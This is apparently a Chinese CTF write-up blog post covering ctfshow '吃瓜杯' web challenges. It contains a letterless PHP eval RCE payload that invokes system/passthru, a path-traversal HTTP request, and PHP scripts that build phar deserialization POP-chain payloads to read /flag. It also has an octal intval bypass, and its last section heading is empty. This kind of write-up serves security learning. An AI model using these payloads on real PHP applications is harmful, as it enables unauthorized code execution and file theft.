+++
title = "ctfshow吃瓜杯"
slug = "ctfshow-melon-eating-cup"
description = "刷"
date = "2024-12-22T13:10:11"
lastmod = "2024-12-22T13:10:11"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["phar", "php"]
+++

## shellme

进去就是个phpinfo，环境变量里面有flag

不过看到有2.0版本，那干脆就看看题了，这里我们看看这个东西，搜索hint拿到参数，get传参试试

```php
<?php
error_reporting(0);
if ($_GET['looklook']){
    highlight_file(__FILE__);
}else{
    setcookie("hint", "?looklook", time()+3600);
}
if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) || strlen($ctfshow) <= 107) {
        if (!preg_match("/[!@#%^&*:'\"|`a-zA-BD-Z~\\\\]|[4-9]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("fucccc hacker!!");
        }
    }
} else {

    phpinfo();
}
?>
```

这里可以无字母参数RCE，对于当时可能是很难的考点但是现在的话就很简单了

```
ctf_show=$_=_(_/_)[_];$__=++$_;$$__[$__=_.++$_.$__[$_++/$_++].++$_.++$_]($$__[_]);&_POST=system&_=whoami

ctf_show=%24%5F%3D%5F%28%5F%2F%5F%29%5B%5F%5D%3B%24%5F%5F%3D%2B%2B%24%5F%3B%24%24%5F%5F%5B%24%5F%5F%3D%5F%2E%2B%2B%24%5F%2E%24%5F%5F%5B%24%5F%2B%2B%2F%24%5F%2B%2B%5D%2E%2B%2B%24%5F%2E%2B%2B%24%5F%5D%28%24%24%5F%5F%5B%5F%5D%29%3B&%5FPOST=system&%5F=whoami
```

这个poc肯定是对的，但是后面我发现他也不报错，也没有回显，后面本地Debug才知道`_`不解析，所以要全部编码才行，但是还是不行真是奇怪了，再看看phpinfo发现disablefunction特别多，但是passthru还可以用

```
ctf_show=%24_%3D(_%2F_._)%5B0%5D%3B%24__%3D%2B%2B%24_%3B%24__%3D_.%2B%2B%24_.%24__%3B%2B%2B%24_%3B%2B%2B%24_%3B%24__.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24__%5B0%5D(%24%24__%5B_%5D)%3B&0=passthru&_=whoami
```

但是看了我的poc的师傅应该是知道换了poc了，我不知道为什么`_POST`的这种不行，很奇怪倒腾了很久我

## shellme_Revenge

如上

## ATTup

先查看源码先，有用的信息就看到个`find.php`，不能直接访问，但是有个文件查询的接口看看能不能路径穿越，成功了

```http
POST /find.php HTTP/1.1
Host: 23d5b4e5-5b1d-4c2b-a646-f5d4745e9463.challenge.ctf.show
Cookie: cf_clearance=H0Ov.OeXjwWbt35e__zOS3XUCsfJEj6Oi6OR3ViIqlY-1734843994-1.2.1.1-GLytTbxT0a_Mvbu09eM6TZAeVu9y8nal9TpsHbK9XH5xXCP3VnIdLSSuhbc0jPsbUTUQpqxJqRYZ1xFKXHzIEM75QV6KLdxBHkq3uPCX46hWWS36.gamC9D35ucYELWbNDbHncMqILIXSwYqO6MnnQyMZRzIvdl7VvqZkom0P4HpI0Kk2..jYCqUqLzNqY1QDEksj5DkggKzmDX_0OvrKTPy6aTilOcrTN2o9FBBZBnI3o95S8O2KRe.B37ovHgdTh1bKRgdVKUN_eOYinGaYRdBe7_0.3Q8SzasLHlzXQUoLDuR1Q0wVdwDYrCEsezlGutYBfxeSFxljtYZf7CFS4KioWX3U49VBoKZJMPkOjqzpij8ODDRcLqsEbGHju5c
Content-Length: 18
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://23d5b4e5-5b1d-4c2b-a646-f5d4745e9463.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://23d5b4e5-5b1d-4c2b-a646-f5d4745e9463.challenge.ctf.show/search.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close

file=..%2Ffind.php
```

```php
<?php

class View {
    public $fn;

    public function __invoke() {
        $text = base64_encode(file_get_contents($this->fn));
        echo "<script>alert('" . $text . "');self.location=document.referrer;</script>";
    }
}

class Fun {
    public $fun = ":)";

    public function __toString() {
        $fuc = $this->fun;
        $fuc();
        return "<script>alert('Be a happy string~');self.location=document.referrer;</script>";
    }

    public function __destruct() {
        echo "<script>alert('Just a fun " . $this->fun . "');self.location=document.referrer;</script>";
    }
}

$filename = $_POST["file"];
$stat = @stat($filename);

?>
```

能直接读取文件？，前面说了zip等协议，那估计就是phar反序列化了，

pop链子就是

```
@stat($filename);->Fun::toString->View::invoke
```

写个poc

```php
<?php
class View {
    public $fn;
}

class Fun {
    public $fun ;
}
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering();     //开缓冲
$phar->setStub("GIF89a<?php __HALT_COMPILER();?>");
$o=new Fun();
$o->fun=new View();
$o->fun->fn="/flag";
$phar->setMetadata($o);
$phar->addFromString("test.txt","test");  // 写入test.txt
$phar->stopBuffering();      //关缓冲
?>
```

然后把后缀一改然后上传解析即可

```
phar.phar->phar.zip
phar://phar.zip
```

其中php内容为黑名单所以stub中不能有php，但是不对劲，没有得到flag，后面看了一下destruct方法还有要处理的地方，所以得在外面再套一层而且stat不会触发toString，因为第一眼看太快了，filename就是一个字符串，并不是对象，所以链子应该是

```
Fun::destruct->Fun::toString->View::invoke
```

```php
<?php
class View {
    public $fn;
}

class Fun {
    public $fun ;
}
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering();     //开缓冲
$phar->setStub("GIF89a"."__HALT_COMPILER();");
$o=new Fun();
$o->fun=new Fun();
$o->fun->fun=new View();
$o->fun->fun->fn='/flag';
$phar->setMetadata($o);
$phar->addFromString("test.txt","test");  // 写入test.txt
$phar->stopBuffering();      //关缓冲
?>
```

## 热身

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

不能有字母，八进制绕过，前缀为0

```
https://b58caeb6-cd5b-48b7-bf0c-63727774b79e.challenge.ctf.show/?num=+010574
```

## 魔女





